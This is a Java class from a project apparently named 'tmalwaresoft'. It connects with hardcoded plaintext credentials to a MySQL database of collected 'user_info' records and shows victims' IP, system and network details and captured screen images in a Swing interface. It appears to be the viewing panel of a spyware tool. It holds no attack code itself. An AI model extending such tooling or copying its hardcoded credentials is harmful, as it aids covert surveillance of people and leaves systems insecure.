package tmalwaresoft;

import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import com.mysql.jdbc.Statement;
import java.awt.Image;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Date;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JTable;
import javax.swing.JTextArea;
import javax.swing.table.DefaultTableModel;

/**
 *
 * @author amine gasa
 */
public class Database {
    
  private final  String user="Tinotenda Mhlanga";
   private final  String password="tino123";
   String ipLocal="192.168.65.128";
   private String url="jdbc:mysql://" + ipLocal + ":3306/t_malware_info";
   private Connection conn;
  private Statement stat;
  private PreparedStatement stat1;
  private ResultSet result;
   public void ConnctDb(){
      try {
          Class.forName("com.mysql.jdbc.Driver");

          try {
              conn=(Connection)DriverManager.getConnection(url,user,password);
          } catch (SQLException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
          
          
      } catch (ClassNotFoundException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }
   
   void information(JTable t) {
      try {
          stat = (Statement) conn.createStatement();
          String sql = "select id, ip_info, date from user_info";
          result = (ResultSet)stat.executeQuery(sql);
          DefaultTableModel model = (DefaultTableModel) t.getModel();
          Object row[] = new Object[3];
          while(result.next()) {
              row[0] = result.getInt("id");
              row[1] = result.getString("ip_info");
              row[2] = result.getString("date");
              model.addRow(row);
              
          }
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }
      
      void getData(JTextArea jt, int id) {
       String sql = "select * from user_info where id =?";
      try {
          stat1 = (PreparedStatement)conn.prepareStatement(sql);
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
       
      try {
          stat1.setInt(1, id);
          result = (ResultSet)stat1.executeQuery();
          String s = "";
          if(result.next()) {
              s = "ID : " + result.getInt("id") + "\n" + "Date: " + result.getString("date")
                      + "\n" + result.getString("ip_info") + "\n" + result.getString("system_info") + "\n\n" +
                      result.getString("network_info") + "";
          }
          jt.setText(s);
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
       
   }
      
      public void Capture(JLabel label, int id) {
          String sql = "select image from user_info where id= ?";
          try {
               stat1 = (PreparedStatement)conn.prepareStatement(sql);
               stat1.setInt(1, id);
               result = (ResultSet)stat1.executeQuery();
               if(result.next()) {
                   label.setIcon(resizeImage(result.getBytes("image"), label));
          }
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
    }

    private Icon resizeImage(byte[] bytes, JLabel label) {
       ImageIcon imgIcon = new ImageIcon(bytes);
       Image img = imgIcon.getImage();
       Image new_img = img.getScaledInstance(label.getWidth(), label.getHeight(), Image.SCALE_SMOOTH);
       ImageIcon image = new ImageIcon(new_img);
       return image;
    }
}